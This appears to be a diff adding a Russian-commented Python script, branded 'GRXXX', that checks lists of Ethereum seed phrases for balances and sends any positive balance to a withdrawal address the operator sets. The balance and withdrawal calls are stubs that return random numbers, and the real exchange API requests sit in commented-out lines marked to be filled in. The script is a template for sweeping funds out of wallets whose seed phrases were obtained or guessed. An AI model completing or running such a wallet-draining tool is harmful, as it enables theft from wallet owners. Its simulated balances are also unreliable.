@@ -1,0 +1,99 @@
+GRXXX { hide and seek } - {402} :
+
+!ВНИМАНИЕ : перед началом работы , стоит установить все пакеты , включая pip install mnemonic ; pip install eth_account aiohttp.
+
+
+import hashlib
+import os
+import mnemonic
+import random
+import asyncio
+import aiohttp
+from eth_account import Account
+
+async def проверить_сид_фразу(seed_phrase, блокчейн_api_key=None, адрес_вывода=None, session=None):
+    """
+{GRXXX} Асинхронно проверяет баланс кошелька, полученного из сид-фразы, и, если баланс положительный, отправляет запрос на вывод средств.
+    """
+    try:
+        m = mnemonic.Mnemonic("english")
+        if not m.check(seed_phrase):
+            print(f"Ошибка: Невалидная сид-фраза: {seed_phrase}")
+            return None
+
+        acct = Account.from_mnemonic(seed_phrase)
+        address = acct.address
+        balance = await получить_баланс_кошелька(address, блокчейн_api_key, session)
+
+        if balance is not None:
+            print(f"Баланс кошелька {address}: {balance} для сид-фразы: {seed_phrase}")
+            if balance > 0 and адрес_вывода:
+                await запрос_на_вывод_средств(address, адрес_вывода, balance, session)
+            return balance
+        else:
+            print(f"Не удалось получить баланс кошелька для сид-фразы: {seed_phrase}")
+            return None
+
+    except Exception as e:
+        print(f"Произошла ошибка: {e} для сид-фразы: {seed_phrase}")
+        return None
+
+async def получить_баланс_кошелька(address, api_key=None, session=None):
+    """
+{GRXXX} Получает баланс кошелька (асинхронно).
+    Замените на реальную интеграцию с блокчейном, используя aiohttp для асинхронных запросов.
+    """
+    # Пример: Запрос к API блокчейна с использованием aiohttp
+    # url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={api_key}"
+    # async with session.get(url) as resp:
+    #     data = await resp.json()
+    #     return int(data['result']) / 10**18  # Преобразование из Wei в Ether
+    await asyncio.sleep(random.uniform(0.5, 1.5))  # Имитация задержки при запросе к API
+    return random.uniform(0, 100)
+
+async def запрос_на_вывод_средств(address_источника, address_назначения, сумма, session=None):
+    """
+{GRXXX} Отправляет запрос на вывод средств (асинхронно).
+    Замените на реальную логику запроса на вывод средств через API блокчейна.
+    """
+    # Пример: Отправка POST запроса на вывод средств
+    # url = "https://api.blockchain.com/v3/exchange/withdrawals" # Замените на актуальный URL
+    # payload = {"address": address_назначения, "amount": сумма}
+    # async with session.post(url, json=payload) as resp:
+    #     print(await resp.text())
+    await asyncio.sleep(random.uniform(0.3, 0.8))  # Имитация задержки при отправке запроса
+    print(f"Отправлен запрос на вывод {сумма} с адреса {address_источника} на адрес {address_назначения}")
+
+async def проверить_список_сид_фраз(seed_phrases, блокчейн_api_key=None, адрес_вывода=None):
+    """
+{GRXXX} Асинхронно проверяет баланс кошельков для списка сид-фраз.
+    """
+    результаты = {}
+    async with aiohttp.ClientSession() as session:
+        tasks = [проверить_сид_фразу(seed_phrase, блокчейн_api_key, адрес_вывода, session) for seed_phrase in seed_phrases]
+        balances = await asyncio.gather(*tasks)
+
+    for i, seed_phrase in enumerate(seed_phrases):
+        результаты[seed_phrase] = balances[i]
+
+    return результаты
+
+async def main():
+    seed_phrases = [
+        "abandon ability able about above absent absorb abstract absurd abuse access accident",
+        "ability able about above absent absorb abstract absurd abuse access accident abandon",
+        "about above absent absorb abstract absurd abuse access accident abandon ability able"
+    ]
+    адрес_вывода = "0xYourWithdrawalAddressHere" # Укажите адрес для вывода средств
+    блокчейн_api_key = "YourBlockchainApiKeyHere" # Укажите API ключ для блокчейна, если необходимо
+
+    результаты = await проверить_список_сид_фраз(seed_phrases, блокчейн_api_key, адрес_вывода)
+
+    print("Результаты проверки:")
+    for seed_phrase, balance in результаты.items():
+        print(f"Сид-фраза: {seed_phrase}, Баланс: {balance}")
+
+if __name__ == "__main__":
+    asyncio.run(main())
+
+MADE IN GRXXX {402}
